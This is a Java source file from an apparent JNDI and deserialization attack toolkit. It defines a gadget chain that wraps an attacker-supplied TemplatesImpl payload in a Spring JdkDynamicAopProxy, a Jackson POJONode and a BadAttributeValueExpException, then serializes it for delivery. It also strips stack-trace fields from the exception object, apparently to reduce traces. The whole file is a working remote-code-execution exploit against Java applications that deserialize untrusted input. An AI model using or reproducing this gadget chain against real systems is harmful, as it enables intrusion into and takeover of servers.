package sonomon.jndi.deser.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import org.springframework.aop.framework.AdvisedSupport;


public class Jackson_BadAttribute_JdkDynamicAopProxy_Templates implements SerializeObject{
	//jackson1_100
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(tempImpl);
        Constructor constructoraop = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructoraop.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructoraop.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
		
		
        POJONode node = new POJONode(proxy);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Deserialize.setFieldValue(val,"val",node);
        // 删除堆栈信息
        Deserialize.setFieldValue(val, "stackTrace", new StackTraceElement[0]);
        Deserialize.setFieldValue(val, "cause", null);
        Deserialize.setFieldValue(val, "suppressedExceptions", null);
        
        return val;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}